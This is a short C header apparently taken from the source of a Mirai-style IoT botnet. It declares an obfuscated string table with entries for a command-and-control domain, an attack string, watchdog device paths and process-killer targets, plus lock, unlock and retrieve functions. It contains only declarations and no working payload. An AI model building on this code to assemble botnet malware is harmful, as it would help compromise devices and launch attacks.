#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

#define TABLE_CNC_DOMAIN     1
#define TABLE_ATK_VSE        2
#define TABLE_WATCHDOG_1     3
#define TABLE_WATCHDOG_2     4
#define TABLE_WATCHDOG_3     5
#define TABLE_WATCHDOG_4     6
#define TABLE_WATCHDOG_5     7
#define TABLE_WATCHDOG_6     8
#define TABLE_WATCHDOG_7     9
#define TABLE_WATCHDOG_8     10
#define TABLE_WATCHDOG_9     11
#define TABLE_KILLER_PROC    12
#define TABLE_KILLER_EXE     13
#define TABLE_KILLER_FD      14

#define TABLE_MAX_KEYS       15 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
